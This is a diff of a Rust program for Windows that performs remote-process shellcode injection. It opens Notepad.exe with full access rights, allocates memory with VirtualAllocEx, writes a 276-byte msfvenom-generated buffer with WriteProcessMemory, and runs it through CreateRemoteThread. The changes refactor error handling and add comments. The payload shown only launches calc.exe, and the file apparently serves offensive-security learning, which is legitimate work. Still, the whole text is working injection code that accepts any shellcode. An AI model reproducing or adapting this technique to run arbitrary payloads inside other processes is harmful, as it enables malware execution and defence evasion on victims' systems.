@@ -1,40 +1,54 @@
-#![allow(unused_must_use)]
-
 use std::mem::transmute;
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use windows::core::{Error, Result};
+use windows::Win32::Foundation::E_FAIL;
 use windows::Win32::{
     Foundation::{CloseHandle, HANDLE},
     System::{
         Diagnostics::Debug::WriteProcessMemory,
         Memory::{
-            VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ
+            VirtualAllocEx, MEM_COMMIT, 
+            MEM_RESERVE, PAGE_EXECUTE_READ
         },
         Threading::{
-            CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
+            CreateRemoteThread, OpenProcess, 
+            WaitForSingleObject, INFINITE, 
+            PROCESS_ALL_ACCESS,
         },
     },
 };
 
-fn find_process(name: &str) -> Result<HANDLE, String> {
+
+/// Finds a process by its executable name and opens it with full access rights.
+///
+/// # Parameters
+///
+/// * `name` - The name of the process to search for (e.g., `"notepad.exe"`).
+///
+/// # Returns
+///
+/// * `Ok(HANDLE)` - if process found and opened.
+/// * `Err` - if process not found or cannot open.
+fn find_process(name: &str) -> Result<HANDLE> {
     let mut system = System::new_all();
     system.refresh_all();
 
-    for (pid, process) in system.processes() {
-        if process.name() == name {
-            let pid = pid.as_u32();
-            let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
-            if hprocess.is_err() {
-                return Err(String::from(format!("Failed to open process with PID: {pid}")));
-            } else {
-                return Ok(hprocess.unwrap());
-            }
-        }
+    let processes = system
+        .processes()
+        .values()
+        .filter(|process| process.name().to_lowercase() == name)
+        .collect::<Vec<_>>();
+
+    if let Some(process) = processes.into_iter().next() {
+        println!("[+] Process with PID found: {}", process.pid());
+        let hprocess = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, process.pid().as_u32())? };
+        return Ok(hprocess);
     }
 
-    return Err(String::from("Process not found"));
+    Err(Error::new(E_FAIL, "Error finding process PID".into()))
 }
 
-fn main() {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let buf: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -58,12 +72,11 @@ fn main() {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
 
-    let h_process = find_process("Notepad.exe").unwrap_or_else(|e| {
-        panic!("[!] find_process Failed With Error: {e}");
-    });
-
     unsafe {
-        println!("[+] Allocating Memory in the Process");
+        // Locate the process "Notepad.exe" and retrieve its handle
+        let h_process = find_process("Notepad.exe")?;
+        
+        // Allocating Memory in the Process
         let address = VirtualAllocEx(
             h_process,
             None,
@@ -73,17 +86,14 @@ fn main() {
         );
 
         if address.is_null() {
-            CloseHandle(h_process);
-            panic!("[!] Failed to Allocate Memory in Target Process.");
+            eprintln!("Failed to Allocate Memory in Target Process.");
+            return Ok(())
         }
 
-        println!("[+] Writing to memory");
-        WriteProcessMemory(h_process, address, buf.as_ptr() as _, buf.len(), None).unwrap_or_else(|e| {
-            CloseHandle(h_process);
-            panic!("[!] WriteProcessMemory Failed With Error: {e}");
-        });
+        // Write the shellcode into the allocated memory
+        WriteProcessMemory(h_process, address, buf.as_ptr().cast(), buf.len(), None)?;
 
-        println!("[+] Creating a Remote Thread");
+        // Create a remote thread to execute the shellcode
         let h_thread = CreateRemoteThread(
             h_process,
             None,
@@ -92,15 +102,14 @@ fn main() {
             None,
             0,
             None,
-        ).unwrap_or_else(|e| {
-            CloseHandle(h_process);
-            panic!("[!] CreateRemoteThread Failed With Error: {e}",);
-        });
+        )?;
 
         println!("[+] Executed!!");
         WaitForSingleObject(h_thread, INFINITE);
 
-        CloseHandle(h_process);
-        CloseHandle(h_thread);
+        CloseHandle(h_process)?;
+        CloseHandle(h_thread)?;
     }
+
+    Ok(())
 }
